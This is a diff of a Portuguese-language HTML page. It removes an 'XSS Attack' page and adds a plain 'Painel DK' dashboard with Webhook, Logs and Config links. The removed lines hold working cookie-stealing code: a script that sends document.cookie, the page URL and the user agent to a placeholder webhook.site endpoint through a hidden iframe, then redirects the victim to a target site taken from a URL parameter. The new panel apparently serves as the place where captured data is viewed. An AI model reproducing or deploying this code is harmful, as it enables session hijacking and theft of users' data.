@@ -1,108 +1,36 @@
-<!DOCTYPE html><html lang="pt-br">
+<!DOCTYPE html>
+<html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>XSS Attack Neon UI</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }body {
-  height: 100vh;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: linear-gradient(135deg, #0a0a1f, #000010);
-  color: #ccefff;
-  overflow: hidden;
-}
-
-.container {
-  background: rgba(10, 10, 30, 0.6);
-  backdrop-filter: blur(10px);
-  border-radius: 16px;
-  padding: 30px 40px;
-  border: 1px solid #33c0ff;
-  box-shadow: 0 0 20px rgba(51, 192, 255, 0.3), 0 0 60px rgba(170, 0, 255, 0.2);
-  max-width: 400px;
-  width: 90%;
-  text-align: center;
-  position: relative;
-}
-
-.container::before {
-  content: '';
-  position: absolute;
-  top: -50%;
-  left: -50%;
-  width: 200%;
-  height: 200%;
-  background: radial-gradient(circle, rgba(255,255,255,0.05) 10%, transparent 70%);
-  animation: rotate 20s linear infinite;
-  z-index: 0;
-}
-
-@keyframes rotate {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}
-
-h1 {
-  font-size: 1.8rem;
-  margin-bottom: 10px;
-  color: #ccefff;
-  text-shadow: 0 0 6px #33c0ff;
-}
-
-p {
-  font-size: 0.9rem;
-  color: #a8c7dd;
-  margin-bottom: 20px;
-}
-
-.glow-bar {
-  height: 4px;
-  background: linear-gradient(to right, #33c0ff, #9933ff, #00f6ff);
-  border-radius: 4px;
-  animation: flow 3s linear infinite;
-}
-
-@keyframes flow {
-  0% { background-position: 0% 50%; }
-  100% { background-position: 100% 50%; }
-}
-
-  </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Painel DK</title>
+  <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
-  <div class="container">
-    <h1>Executando Payload XSS...</h1>
-    <p>Seu ataque está em curso. Aguarde redirecionamento automático.</p>
-    <div class="glow-bar"></div>
-  </div>  <script>
-    const siteAlvo = decodeURIComponent(new URLSearchParams(window.location.search).get("site")) || "https://example.com";
-    const webhook = "https://webhook.site/seuWebhookAqui";
-    const payload = `<script>
-      fetch('${webhook}', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          cookie: document.cookie,
-          location: window.location.href,
-          userAgent: navigator.userAgent
-        })
-      });
-    </script>`;const iframe = document.createElement("iframe");
-iframe.srcdoc = payload;
-iframe.style.display = "none";
-document.body.appendChild(iframe);
 
-setTimeout(() => {
-  window.location.href = siteAlvo;
-}, 10000);
+  <!-- MENU TOP -->
+  <nav class="menu-top">
+    <a href="index.html">Principal</a>
+    <a href="webhook.html">Webhook</a>
+    <a href="logs.html">Logs</a>
+    <a href="config.html">Configuração</a>
+  </nav>
 
-  </script>
+  <!-- LOADING -->
+  <div id="loading-screen">
+    <div class="loader-card">
+      <h2>Carregando Painel...</h2>
+      <p>Estamos carregando seus recursos, aguarde um momento.</p>
+      <div class="progress-bar"><div class="progress-fill"></div></div>
+    </div>
+  </div>
+
+  <!-- CONTEÚDO PRINCIPAL -->
+  <main class="conteudo">
+    <h1>Bem-vindo ao Painel DK</h1>
+    <p>Escolha uma das opções acima para continuar.</p>
+  </main>
+
+  <script src="js/script.js"></script>
 </body>
 </html>
